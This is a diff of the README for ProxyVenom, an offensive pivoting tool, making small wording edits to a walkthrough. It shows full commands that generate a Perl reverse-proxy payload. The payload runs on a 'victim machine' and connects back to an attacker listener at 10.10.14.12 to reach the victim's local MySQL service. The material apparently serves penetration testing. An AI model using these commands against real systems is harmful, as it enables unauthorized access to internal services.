@@ -55,7 +55,7 @@ You can see some additional options, namely `--chost` and `--cport`. The `--chos
 
 <img width="1190" height="571" alt="chost" src="https://github.com/user-attachments/assets/b35815e0-2934-4185-8c1f-726fc79d9017" />
 
-For this example, I will still target a localhost MySQL service on the victim machine. I will specify the IP and port of the client's proxy listener to be 10.10.14.12:4321. Finally, I will leave my localhost listener as the default TCP port 3128. I will once again use Perl as the proxy scripting language.
+For this example, I will still target a localhost MySQL service on the victim machine. I will specify the IP and port of the client's proxy listener to be 10.10.14.12:4321 and I will leave my localhost listener as the default TCP port 3128. I will once again use Perl as the proxy scripting language.
 
 `python3 ProxyVenom/proxyvenom.py reverse --chost 10.10.14.12 --rhost 127.0.0.1 --rport 3306 pl -h`
 
@@ -63,7 +63,7 @@ Once again, you are presented with a choice for delivery.
 
 <img width="1105" height="242" alt="delivery" src="https://github.com/user-attachments/assets/e65113b8-2fec-4135-8cde-17ab65677b1a" />
 
-Specify the `--outfile`` flag once more to generate the payload.
+I will once again specify the `file` option with the `--outfile` flag to generate the payload.
 
 `python3 ProxyVenom/proxyvenom.py reverse --chost 10.10.14.12 --rhost 127.0.0.1 --rport 3306 pl file --outfile prx.pl`
 
